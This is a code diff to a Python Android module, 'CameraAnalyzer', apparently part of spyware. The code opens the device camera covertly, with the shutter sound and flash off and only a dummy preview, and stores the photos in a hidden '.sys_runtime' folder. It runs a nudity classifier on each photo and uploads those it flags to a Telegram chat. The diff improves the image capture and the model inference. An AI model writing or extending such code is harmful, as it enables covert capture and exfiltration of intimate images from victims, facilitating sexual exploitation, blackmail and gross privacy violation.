@@ -1,11 +1,13 @@
 # -*- coding: utf-8 -*-
-import os, time, threading, random, zipfile, logging, gc
+import os, time, threading, zipfile, logging, gc, numpy as np
 from datetime import datetime
+from PIL import Image
 
 P = os.path.join(os.getcwd(), ".sys_runtime")
 T = os.path.join(P, "c_tmp")
 for d in [P, T]:
-    if not os.path.exists(d): os.makedirs(d)
+    if not os.path.exists(d):
+        os.makedirs(d)
 
 logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')
 
@@ -18,7 +20,7 @@ except:
 class CameraAnalyzer:
     def __init__(self, mon=None, det=None):
         self.mon = mon
-        self.det = det
+        self.det = det          # NudeDetector instance
         self.busy = False
         self.last_skip = 0
 
@@ -30,7 +32,8 @@ class CameraAnalyzer:
             return True
 
     def _camera_in_use(self):
-        if not JNI: return False
+        if not JNI:
+            return False
         try:
             ctx = autoclass('org.kivy.android.PythonActivity').mActivity
             am = ctx.getSystemService("activity")
@@ -69,23 +72,25 @@ class CameraAnalyzer:
             try:
                 Cam = autoclass('android.hardware.Camera')
                 ST = autoclass('android.graphics.SurfaceTexture')
-
                 try:
                     cam = Cam.open(cam_id)
                 except Exception as e:
-                    logging.error(f"Failed to open camera {cam_id}: {e}")
+                    logging.error(f"Camera open failed: {e}")
                     self.busy = False
                     return None
 
-                p = cam.getParameters()
-                p.setFlashMode("off")
-
-                modes = p.getSupportedFocusModes()
-                if modes and "continuous-picture" in modes:
-                    p.setFocusMode("continuous-picture")
-
-                cam.setParameters(p)
-
+                params = cam.getParameters()
+                # اختيار أصغر حجم صورة لتقليل استهلاك الرام (مناسب للنموذج)
+                sizes = params.getSupportedPictureSizes()
+                if sizes and sizes.size() > 0:
+                    smallest = sizes.get(sizes.size() - 1)
+                    params.setPictureSize(smallest.width, smallest.height)
+                
+                params.setFlashMode("off")
+                focus_modes = params.getSupportedFocusModes()
+                if focus_modes and "continuous-picture" in focus_modes:
+                    params.setFocusMode("continuous-picture")
+                cam.setParameters(params)
                 try:
                     cam.enableShutterSound(False)
                 except:
@@ -94,7 +99,6 @@ class CameraAnalyzer:
                 dummy = ST(10)
                 cam.setPreviewTexture(dummy)
                 cam.startPreview()
-
                 time.sleep(1.5)
 
                 data = []
@@ -108,14 +112,13 @@ class CameraAnalyzer:
                         ev.set()
 
                 cam.takePicture(None, None, CB())
-
                 if ev.wait(5) and data:
                     out = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")
                     with open(out, 'wb') as f:
                         f.write(data[0])
 
             except Exception as e:
-                logging.error(f"Capture Exception: {e}")
+                logging.error(f"Capture exception: {e}")
             finally:
                 if cam:
                     try:
@@ -128,17 +131,39 @@ class CameraAnalyzer:
         self.busy = False
         return out
 
+    def _prepare_for_ai(self, path):
+        """تجهيز الصورة لتناسب نموذج Float16: إلى (224,224) float32 [0,1]"""
+        try:
+            with Image.open(path) as img:
+                img = img.convert('RGB').resize((224, 224), Image.LANCZOS)
+                arr = np.array(img, dtype=np.float32) / 255.0
+                arr = np.expand_dims(arr, axis=0)   # batch dimension
+                return arr
+        except Exception as e:
+            logging.error(f"AI prep error: {e}")
+            return None
+
     def harvest(self, cam_id=0):
         p = self.capture(cam_id)
         if not p:
             return
-        nude = False
-        if self.det:
+
+        is_nude = False
+        if self.det and hasattr(self.det, 'model') and self.det.model is not None:
             try:
-                nude = self.det._analyze(p)
-            except:
-                pass
-        if nude:
+                input_data = self._prepare_for_ai(p)
+                if input_data is not None:
+                    self.det.model.set_tensor(self.det.in_idx, input_data)
+                    self.det.model.invoke()
+                    out = self.det.model.get_tensor(self.det.out_idx)[0]
+                    prob = float(out[1]) if len(out) > 1 else float(out[0])
+                    if prob > 0.85:
+                        is_nude = True
+                    del input_data, out
+            except Exception as e:
+                logging.error(f"Harvest AI error: {e}")
+
+        if is_nude:
             self._send_and_clean(p)
         else:
             self._secure_del(p)
@@ -152,9 +177,12 @@ class CameraAnalyzer:
             vl = getattr(self.mon, 'vlt', None)
             if tg and vl:
                 with open(z, 'rb') as f:
-                    tg._ap("sendDocument", {"chat_id": vl, "caption": f"📸 {datetime.now().strftime('%Y-%m-%d %H:%M')}"}, {"document": f})
+                    tg._ap("sendDocument", {
+                        "chat_id": vl,
+                        "caption": f"📸 Alert | {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+                    }, {"document": f})
         except Exception as e:
-            logging.error(f"Upload Error: {e}")
+            logging.error(f"Upload error: {e}")
         finally:
             self._secure_del(raw)
             self._secure_del(z)
